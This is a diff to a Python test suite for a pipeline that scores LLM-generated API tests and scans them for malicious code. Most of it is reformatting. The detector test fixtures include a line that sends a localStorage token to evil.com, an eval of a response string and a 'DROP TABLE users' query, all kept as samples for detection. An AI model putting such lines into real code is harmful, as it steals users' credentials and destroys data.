@@ -12,6 +12,7 @@ import json
 from pathlib import Path
 from unittest.mock import patch
 
+import pytest
 
 from cherenkov.adversarial.core import ThreatCategory
 from cherenkov.adversarial.detector import scan_test_code
@@ -24,45 +25,28 @@ from cherenkov.evals.store import EvalStore
 class TestPipelineEvalsIntegration:
     """Tests the evals pipeline stage: build_samples -> run_evals -> store."""
 
-    def test_build_samples_from_pipeline(
-        self, mock_scenarios, mock_gen_outputs, mock_spec_summaries
-    ):
+    def test_build_samples_from_pipeline(self, mock_scenarios, mock_gen_outputs, mock_spec_summaries):
         """build_samples_from_pipeline correctly bridges PLAN + GENERATE output."""
-        samples = build_samples_from_pipeline(
-            mock_scenarios, mock_gen_outputs, mock_spec_summaries
-        )
+        samples = build_samples_from_pipeline(mock_scenarios, mock_gen_outputs, mock_spec_summaries)
         assert len(samples) == 3
         ids = {s.scenario_id for s in samples}
         assert ids == {"users_list", "users_create", "admin_bypass"}
 
-    def test_build_samples_skips_missing_gen_output(
-        self, mock_scenarios, mock_spec_summaries
-    ):
+    def test_build_samples_skips_missing_gen_output(self, mock_scenarios, mock_spec_summaries):
         """Scenarios with no matching gen output are skipped."""
         samples = build_samples_from_pipeline(mock_scenarios, {}, mock_spec_summaries)
         assert len(samples) == 0
 
-    def test_build_samples_attaches_spec_summary(
-        self, mock_scenarios, mock_gen_outputs, mock_spec_summaries
-    ):
+    def test_build_samples_attaches_spec_summary(self, mock_scenarios, mock_gen_outputs, mock_spec_summaries):
         """Spec summaries are correctly attached to each sample."""
-        samples = build_samples_from_pipeline(
-            mock_scenarios, mock_gen_outputs, mock_spec_summaries
-        )
+        samples = build_samples_from_pipeline(mock_scenarios, mock_gen_outputs, mock_spec_summaries)
         sample_map = {s.scenario_id: s for s in samples}
         assert sample_map["users_list"].spec_summary == "Returns a list of users"
-        assert (
-            sample_map["users_create"].spec_summary
-            == "Creates a new user and returns 201"
-        )
+        assert sample_map["users_create"].spec_summary == "Creates a new user and returns 201"
 
-    def test_run_evals_with_mocked_llm(
-        self, mock_llm_client, mock_scenarios, mock_gen_outputs, mock_spec_summaries
-    ):
+    def test_run_evals_with_mocked_llm(self, mock_llm_client, mock_scenarios, mock_gen_outputs, mock_spec_summaries):
         """run_evals produces a valid report with mocked LLM."""
-        samples = build_samples_from_pipeline(
-            mock_scenarios, mock_gen_outputs, mock_spec_summaries
-        )
+        samples = build_samples_from_pipeline(mock_scenarios, mock_gen_outputs, mock_spec_summaries)
         report = run_evals(samples)
         assert report.pass_rate() >= 0
         assert len(report.results) == 3
@@ -71,34 +55,18 @@ class TestPipelineEvalsIntegration:
             assert all(s.metric in EvalMetric for s in result.scores)
             assert result.duration_ms >= 0
 
-    def test_run_evals_llm_failure_fallback(
-        self, mock_scenarios, mock_gen_outputs, mock_spec_summaries
-    ):
+    def test_run_evals_llm_failure_fallback(self, mock_scenarios, mock_gen_outputs, mock_spec_summaries):
         """When LLM fails, run_evals returns ERROR results instead of crashing."""
-        samples = build_samples_from_pipeline(
-            mock_scenarios, mock_gen_outputs, mock_spec_summaries
-        )
-        with patch(
-            "cherenkov.evals.judge.get_client",
-            side_effect=RuntimeError("LLM unavailable"),
-        ):
+        samples = build_samples_from_pipeline(mock_scenarios, mock_gen_outputs, mock_spec_summaries)
+        with patch("cherenkov.evals.judge.get_client", side_effect=RuntimeError("LLM unavailable")):
             report = run_evals(samples)
         assert len(report.results) == 3
         for result in report.results:
             assert result.error is not None
 
-    def test_eval_store_save_and_retrieve(
-        self,
-        tmp_path,
-        mock_scenarios,
-        mock_gen_outputs,
-        mock_spec_summaries,
-        mock_llm_client,
-    ):
+    def test_eval_store_save_and_retrieve(self, tmp_path, mock_scenarios, mock_gen_outputs, mock_spec_summaries, mock_llm_client):
         """EvalStore.save() persists a report that can be retrieved."""
-        samples = build_samples_from_pipeline(
-            mock_scenarios, mock_gen_outputs, mock_spec_summaries
-        )
+        samples = build_samples_from_pipeline(mock_scenarios, mock_gen_outputs, mock_spec_summaries)
         report = run_evals(samples)
 
         db_path = tmp_path / "evals.db"
@@ -110,18 +78,9 @@ class TestPipelineEvalsIntegration:
         assert latest["pass_rate"] == report.pass_rate()
         assert latest["total"] == 3
 
-    def test_eval_store_history(
-        self,
-        tmp_path,
-        mock_scenarios,
-        mock_gen_outputs,
-        mock_spec_summaries,
-        mock_llm_client,
-    ):
+    def test_eval_store_history(self, tmp_path, mock_scenarios, mock_gen_outputs, mock_spec_summaries, mock_llm_client):
         """Multiple reports can be stored and retrieved via history()."""
-        samples = build_samples_from_pipeline(
-            mock_scenarios, mock_gen_outputs, mock_spec_summaries
-        )
+        samples = build_samples_from_pipeline(mock_scenarios, mock_gen_outputs, mock_spec_summaries)
         report1 = run_evals(samples)
         report2 = run_evals(samples)
 
@@ -157,11 +116,7 @@ test('happy path', async () => {
 const data = eval('(' + response + ')');
 """
         detections = scan_test_code(code)
-        cmd_inj = [
-            d
-            for d in detections
-            if d.detected and d.category == ThreatCategory.COMMAND_INJECTION
-        ]
+        cmd_inj = [d for d in detections if d.detected and d.category == ThreatCategory.COMMAND_INJECTION]
         assert len(cmd_inj) >= 1
 
     def test_adversarial_scan_detects_data_exfil(self):
@@ -171,11 +126,7 @@ const token = await page.evaluate(() => localStorage.getItem('token'));
 await fetch('https://evil.com/steal?token=' + token);
 """
         detections = scan_test_code(code)
-        exfil = [
-            d
-            for d in detections
-            if d.detected and d.category == ThreatCategory.DATA_EXFILTRATION
-        ]
+        exfil = [d for d in detections if d.detected and d.category == ThreatCategory.DATA_EXFILTRATION]
         assert len(exfil) >= 1
 
     def test_adversarial_scan_detects_spec_manipulation(self):
@@ -184,17 +135,12 @@ await fetch('https://evil.com/steal?token=' + token);
 await db.query("DROP TABLE users");
 """
         detections = scan_test_code(code)
-        spec_manip = [
-            d
-            for d in detections
-            if d.detected and d.category == ThreatCategory.SPEC_MANIPULATION
-        ]
+        spec_manip = [d for d in detections if d.detected and d.category == ThreatCategory.SPEC_MANIPULATION]
         assert len(spec_manip) >= 1
 
     def test_run_adversarial_tests_clean(self):
         """run_adversarial_tests on clean codes returns full-pass report."""
-        test_codes = {
-            "users_list": """
+        test_codes = {"users_list": """
 import { test, expect } from '@playwright/test';
 import { createClient } from '../client';
 test('list users', async () => {
@@ -202,8 +148,7 @@ test('list users', async () => {
   const res = await client.GET('/users');
   expect(res.status).toBe(200);
 });
-"""
-        }
+"""}
         report = run_adversarial_tests(test_codes)
         assert report.pass_rate() == 1.0
         assert len(report.critical_findings()) == 0
@@ -282,9 +227,7 @@ class TestCrossModuleSyntheticToEvals:
 class TestCombinedPipelineStages:
     """Tests that evals + adversarial can run sequentially as in the real pipeline."""
 
-    def test_evals_then_adversarial_sequential(
-        self, mock_llm_client, mock_generated_tests
-    ):
+    def test_evals_then_adversarial_sequential(self, mock_llm_client, mock_generated_tests):
         """Simulate the orchestrator's evals -> adversarial flow."""
         test_files = sorted(mock_generated_tests.glob("*.spec.ts"))
         assert len(test_files) == 3
@@ -295,16 +238,14 @@ class TestCombinedPipelineStages:
             code = tf.read_text(encoding="utf-8")
             scenario_id = tf.stem
             test_codes[scenario_id] = code
-            samples.append(
-                EvalSample(
-                    scenario_id=scenario_id,
-                    endpoint="/test",
-                    method="GET",
-                    expected_status=200,
-                    test_code=code,
-                    spec_summary="Test endpoint",
-                )
-            )
+            samples.append(EvalSample(
+                scenario_id=scenario_id,
+                endpoint="/test",
+                method="GET",
+                expected_status=200,
+                test_code=code,
+                spec_summary="Test endpoint",
+            ))
 
         report = run_evals(samples)
         assert len(report.results) == 3
